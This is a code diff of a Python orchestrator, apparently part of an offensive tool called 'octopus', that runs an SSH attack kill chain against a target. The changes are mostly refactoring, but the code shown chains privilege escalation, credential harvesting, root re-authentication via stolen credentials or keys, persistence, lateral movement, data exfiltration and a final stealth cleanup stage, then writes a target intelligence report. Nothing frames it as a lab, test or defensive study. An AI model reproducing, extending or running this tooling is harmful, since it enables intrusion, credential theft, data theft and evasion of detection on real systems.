@@ -3,14 +3,8 @@
 Kill chain orchestrator: runs all stages.
 """
 
-import os
 import logging
-import re
-import time
-import socket
-import shutil
-import subprocess
-import concurrent.futures
+import os
 
 try:
     import paramiko
@@ -18,20 +12,22 @@ except ImportError:
     paramiko = None
 
 try:
-    from config import CFG, find_wordlist, find_all_wordlists
+    from config import CFG, find_all_wordlists, find_wordlist
 except ImportError:
     CFG = {}
     def find_wordlist(cat): return ""
     def find_all_wordlists(cat): return []
 
-from core.killchain.ssh_helpers import _ssh_connect, _ssh_exec
-from core.killchain.privesc import run_privesc, _harvest_credentials
-from core.killchain.persistence import plant_persistence
-from core.killchain.lateral import lateral_move
-from core.killchain.exfil import data_exfil
+from typing import Optional
+
 from core.killchain.cleanup import stealth_cleanup
-from core.killchain.vuln_assess import vuln_assess
+from core.killchain.exfil import data_exfil
 from core.killchain.exploitation import auto_exploit
+from core.killchain.lateral import lateral_move
+from core.killchain.persistence import plant_persistence
+from core.killchain.privesc import _harvest_credentials, run_privesc
+from core.killchain.ssh_helpers import _ssh_connect
+from core.killchain.vuln_assess import vuln_assess
 
 logger = logging.getLogger("octopus.killchain.orchestrator")
 
@@ -46,16 +42,14 @@ C_MAGENTA = "\033[95m"
 C_RESET  = "\033[0m"
 
 
-# ═══════════════════════════════════════════════
 # PARAMIKO SSH HELPERS (shared across stages)
-# ═══════════════════════════════════════════════
 
 
-def run_full_killchain(target: str, user: str = None, password: str = None,
+def run_full_killchain(target: str, user: Optional[str] = None, password: Optional[str] = None,
                        recon_data: str = "", port: int = 22) -> str:
     """
     Run the complete kill chain in sequence.
-    v8.1: Correct order with re-authentication after privesc.
+    Re-authenticates after privilege escalation before later stages.
     Order: Privesc → Harvest → Persist → Lateral → Exfil → Cleanup (LAST!)
     """
     print(f"\n  {C_RED}{'=' * 60}{C_RESET}")
@@ -76,7 +70,7 @@ def run_full_killchain(target: str, user: str = None, password: str = None,
         privesc_output = run_privesc(target, user, password, port)
         full_output += privesc_output
 
-        # v8.1: RE-AUTHENTICATE as root after privesc
+        # Re-authenticate as root after privilege escalation.
         eff_user = user
         eff_pass = password
         if "ROOT ACCESS CONFIRMED" in privesc_output or "uid=0(root)" in privesc_output:
@@ -87,28 +81,28 @@ def run_full_killchain(target: str, user: str = None, password: str = None,
                 from tools import get_best_creds_for_target
                 root_creds = get_best_creds_for_target(target, "ssh")
                 root_pass = root_creds[1] if root_creds and root_creds[1] else password
-                test_client, test_err = _ssh_connect(target, "root", root_pass, port)
+                test_client, _test_err = _ssh_connect(target, "root", root_pass, port)
                 if test_client:
                     test_client.close()
                     eff_user = "root"
                     eff_pass = root_pass
                     re_authed = True
                     print(f"  {C_GREEN}[+] RE-AUTHENTICATED as root (credential store){C_RESET}")
-                    full_output += f"\n[+] Re-authenticated as root for stages 4-9\n"
+                    full_output += "\n[+] Re-authenticated as root for stages 4-9\n"
             except Exception as e:
                 logger.debug(f"Root re-auth via credential store failed: {e}")
 
             # Method 2: Try SSH key auth as root
             if not re_authed:
                 try:
-                    test_client, test_err = _ssh_connect(target, "root", "__KEY_AUTH__", port)
+                    test_client, _test_err = _ssh_connect(target, "root", "__KEY_AUTH__", port)
                     if test_client:
                         test_client.close()
                         eff_user = "root"
                         eff_pass = "__KEY_AUTH__"
                         re_authed = True
                         print(f"  {C_GREEN}[+] RE-AUTHENTICATED as root via SSH key{C_RESET}")
-                        full_output += f"\n[+] Re-authenticated as root via SSH key for stages 4-9\n"
+                        full_output += "\n[+] Re-authenticated as root via SSH key for stages 4-9\n"
                 except Exception as _exc:
                     logging.debug(f"Suppressed in orchestrator.py: {_exc}")
 
@@ -137,7 +131,7 @@ def run_full_killchain(target: str, user: str = None, password: str = None,
         # Stage 7: Data Exfiltration (from root = full access)
         full_output += "\n" + data_exfil(target, eff_user, eff_pass, port)
 
-        # Stage 9: Stealth Cleanup (v7.0) — ALWAYS LAST!
+        # Cleanup must always remain the final stage.
         full_output += "\n" + stealth_cleanup(target, eff_user, eff_pass, port)
     else:
         # No creds — run full discovery pipeline
@@ -160,9 +154,7 @@ def run_full_killchain(target: str, user: str = None, password: str = None,
     return full_output
 
 
-# ═══════════════════════════════════════════════
-# STAGE 9: STEALTH CLEANUP (v7.0)
-# ═══════════════════════════════════════════════
+# STAGE 9: STEALTH CLEANUP
 
 
 def _generate_target_report(host: str, user: str, loot_dir: str,
@@ -178,7 +170,7 @@ def _generate_target_report(host: str, user: str, loot_dir: str,
 
     lines = []
     lines.append(f"{'═' * 70}")
-    lines.append(f"  OCTOPUS TARGET INTELLIGENCE REPORT")
+    lines.append("  OCTOPUS TARGET INTELLIGENCE REPORT")
     lines.append(f"  Target: {host}")
     lines.append(f"  Generated: {_dt.now().strftime('%Y-%m-%d %H:%M:%S')}")
     lines.append(f"  Initial Access: {user}@{host}")
@@ -251,7 +243,7 @@ def _generate_target_report(host: str, user: str, loot_dir: str,
     ]
     for stage_name, marker in stages:
         if marker in full_output:
-            m = _re.search(r'{}'.format(_re.escape(marker)) + r'[:\s]*(\d+)', full_output)
+            m = _re.search(rf'{_re.escape(marker)}' + r'[:\s]*(\d+)', full_output)
             count = m.group(1) if m else "?"
             lines.append(f"  {stage_name}: {count}")
     lines.append("")
@@ -268,9 +260,7 @@ def _generate_target_report(host: str, user: str, loot_dir: str,
         print(f"    {C_RED}[!] Failed to save report: {e}{C_RESET}")
 
 
-# ═══════════════════════════════════════════════
 # QUICK TEST
-# ═══════════════════════════════════════════════
 
 if __name__ == "__main__":
     target = input("Target IP: ").strip()
